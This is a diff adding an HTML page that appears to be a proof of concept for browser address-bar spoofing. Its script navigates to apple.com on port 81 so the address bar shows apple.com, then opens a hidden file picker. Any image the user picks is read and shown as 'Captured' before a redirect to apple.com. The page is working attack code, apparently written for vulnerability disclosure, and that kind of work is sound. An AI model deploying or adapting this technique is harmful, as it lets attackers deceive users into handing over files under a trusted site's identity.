@@ -1,0 +1,123 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>tester</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+      body {
+        margin: 0;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        background: #f5f5f7;
+        color: #1d1d1f;
+      }
+      #container {
+        max-width: 380px;
+        margin: 120px auto;
+        background: #fff;
+        padding: 40px 24px;
+        border-radius: 20px;
+        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+        text-align: center;
+      }
+      h2 {
+        margin-top: 0;
+        font-size: 22px;
+        font-weight: 600;
+        margin-bottom: 10px;
+      }
+      p {
+        color: #86868b;
+        font-size: 14px;
+        margin-bottom: 30px;
+      }
+      button {
+        font-size: 16px;
+        padding: 14px 28px;
+        border-radius: 12px;
+        border: none;
+        background: #34c759;
+        color: #fff;
+        display: inline-block;
+        cursor: pointer;
+        font-weight: 600;
+        width: 100%;
+        box-shadow: 0 4px 14px rgba(52, 199, 89, 0.4);
+      }
+      button:active {
+        transform: scale(0.96);
+        background: #2db34f;
+      }
+
+      #preview-container {
+        display: none;
+      }
+      #stolen-img {
+        max-width: 100%;
+        border-radius: 8px;
+        margin-top: 15px;
+        border: 1px solid #d2d2d7;
+      }
+      .poc-log {
+        color: #1d1d1f;
+        font-family: monospace;
+        font-size: 13px;
+        font-weight: bold;
+        text-align: left;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="container">
+      <div id="step-1">
+        <h2>Address Bar Will Change to apple.com for 3 Seconds</h2>
+        <button onclick="executeAttack()">Click Here to Start PoC</button>
+      </div>
+
+      <div id="preview-container">
+        <div class="poc-log">Captured</div>
+        <img id="stolen-img" src="" />
+      </div>
+    </div>
+
+    <input
+      type="file"
+      id="upload"
+      style="display: none"
+      onchange="captureAndRedirect(this)"
+      accept="image/*"
+    />
+
+    <script>
+      function executeAttack() {
+        setTimeout(() => {
+          window.location = "https://apple.com:81";
+        }, 0);
+
+        setTimeout(() => {
+          document.getElementById("upload").click();
+        }, 50);
+      }
+
+      function captureAndRedirect(input) {
+        if (input.files && input.files[0]) {
+          window.stop();
+
+          const step1 = document.getElementById("step-1");
+          const preview = document.getElementById("preview-container");
+          const img = document.getElementById("stolen-img");
+
+          const reader = new FileReader();
+          reader.onload = function (e) {
+            step1.style.display = "none";
+            img.src = e.target.result;
+            preview.style.display = "block";
+            window.location.href = "https://apple.com";
+          };
+          reader.readAsDataURL(input.files[0]);
+        }
+      }
+    </script>
+  </body>
+</html>
